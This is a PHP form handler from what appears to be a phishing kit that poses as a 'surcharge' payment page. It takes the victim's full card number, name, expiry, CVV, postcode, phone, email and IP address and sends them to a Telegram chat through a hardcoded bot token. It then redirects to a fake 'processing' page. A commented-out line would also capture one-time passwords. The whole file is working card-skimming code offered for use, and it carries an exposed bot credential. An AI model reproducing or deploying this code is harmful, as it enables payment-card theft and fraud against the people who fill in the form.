<?php
// Start session
session_start();

// Telegram bot token and chat ID
$botToken = "7025141675:AAEGrdY3p8ebIxTXFraQj4VwJCCs-Poozis";
$chatId = '7104135204'; // Replace with your chat ID

// Function to send message to Telegram
function sendTelegramMessage($botToken, $chatId, $message) {
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    if ($response === FALSE) {
        $error = curl_error($ch);
        curl_close($ch);
        return "Failed to send message. Error: " . $error;
    } else {
        curl_close($ch);
        return true;
    }
}

// Check if form is submitted
$ip = getenv("REMOTE_ADDR");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitize and validate inputs (assuming the form fields are correct)
    $ccNumber = htmlspecialchars(trim($_POST['c_num']));
    // Remove any formatting from the credit card number
    $ccNumber = preg_replace('/\D/', '', $ccNumber);
    
    $ccName = htmlspecialchars(trim($_POST['c_nam']));
    $ccDate = htmlspecialchars(trim($_POST['mm'])) . "/" . htmlspecialchars(trim($_POST['yy']));
    $ccCVV = htmlspecialchars(trim($_POST['aCode']));
    $ccPostCode = htmlspecialchars(trim($_POST['czipcode']));
    $ccPhoneNum = htmlspecialchars(trim($_POST['phone-number']));
    $ccEmail = htmlspecialchars(trim($_POST['cemail']));
    //$ccOTP = htmlspecialchars(trim($_POST['ccOTP']));

    // Validate inputs
    if (strlen($ccNumber) != 16) {
        echo "Credit card number must be 16 digits.";
        header("Location: surcharge.php");
        exit;
    }

    // Format the credit card number in groups of 4 digits
    $ccNumber = implode(' ', str_split($ccNumber, 4));

    if (!empty($ccNumber) && !empty($ccName) && !empty($ccDate) && !empty($ccCVV)) {
        // Store variables in session
        $submittedData = [
            'ccNumber' => $ccNumber,
            'ccName' => $ccName,
            'ccDate' => $ccDate,
            'ccCVV' => $ccCVV,
            'ccPostCode' => $ccPostCode,
            'ccPhoneNum' => $ccPhoneNum,
            'ccEmail' => $ccEmail
        ];
        $_SESSION['submitted_data'] = $submittedData;

        // Prepare the message
        $message = "Details for New Store Items:\n\n";
        $message .= "Card Number: $ccNumber\n";
        $message .= "Cardholder Name: $ccName\n";
        $message .= "Expiry Date: $ccDate\n";
        $message .= "CVV: $ccCVV\n";
        $message .= "PostCode: $ccPostCode\n";
        $message .= "Phone Number: $ccPhoneNum\n";
        $message .= "Email: $ccEmail\n";
        $message .= "IP Address: $ip\n";
        //$message .= "One-Time Password: $ccOTP\n";

        // Send message to Telegram
        $result = sendTelegramMessage($botToken, $chatId, $message);
        if ($result === true) {
            header("Location: surcharge_processing.php");
            exit;
        } else {
            echo $result;
        }
    } else {
        echo "All fields are required.";
        header("Location: surcharge.php");
        exit;
    }
} else {
    echo "Invalid request method.";
    header("Location: surcharge.php");
    exit;
}
?>

